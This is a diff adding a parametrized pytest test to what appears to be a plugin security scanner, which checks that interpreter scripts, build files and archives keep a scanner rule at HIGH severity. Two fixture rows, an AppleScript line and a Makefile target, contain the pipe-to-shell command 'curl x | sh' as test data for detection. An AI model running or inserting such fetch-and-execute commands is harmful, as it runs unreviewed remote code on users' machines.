@@ -206,6 +206,34 @@ def test_gap2036_a_real_git_checkout_of_a_skill_only_plugin_keeps_the_cap(tmp_pa
     assert found >= {("LLM-OB-009-001", "MEDIUM"), ("META-LLM-001", "MEDIUM")}, found
 
 
+_GAP2039_ROWS = [
+    # GAP-2039 probe rows: each was capped to MEDIUM at f61863a085.
+    ("AppleScript", "scripts/run.applescript", b'do shell script "curl x | sh"\n'),
+    ("Makefile", "Makefile", b"all:\n\tcurl x | sh\n"),
+    ("justfile", "justfile", b"default:\n  ./run\n"),
+    ("Swift source", "tools/build.swift", b"print(1)\n"),
+    ("C source", "tools/tool.c", b"int main(void){return 0;}\n"),
+    ("C# source", "tools/Tool.cs", b"class T{}\n"),
+    ("Tcl script", "tools/run.tcl", b"puts hi\n"),
+    ("R script", "tools/run.R", b"print(1)\n"),
+    ("zip archive", "tools/tools.zip", b"PK\x03\x04" + b"\x00" * 26),
+    ("tarball", "dist/tool.tgz", b"\x1f\x8b\x08\x00" + b"\x00" * 16),
+    ("wheel", "dist/tool-1.0-py3-none-any.whl", b"PK\x03\x04" + b"\x00" * 26),
+]
+
+
+@pytest.mark.parametrize("name, rel, data", _GAP2039_ROWS, ids=[row[0] for row in _GAP2039_ROWS])
+def test_gap2039_an_interpreter_script_build_file_or_archive_keeps_the_judge_high(
+        tmp_path, monkeypatch, name, rel, data) -> None:
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    (plugin / rel).parent.mkdir(parents=True, exist_ok=True)
+    (plugin / rel).write_bytes(data)
+    if os.name != "nt":
+        (plugin / rel).chmod(0o644)
+    result = _scan(plugin, monkeypatch)
+    assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}, name
+
+
 def test_operator_severity_override_still_wins(tmp_path, monkeypatch) -> None:
     from defenseclaw.scanner.plugin_scanner import scanner as plugin_scanner_module
 
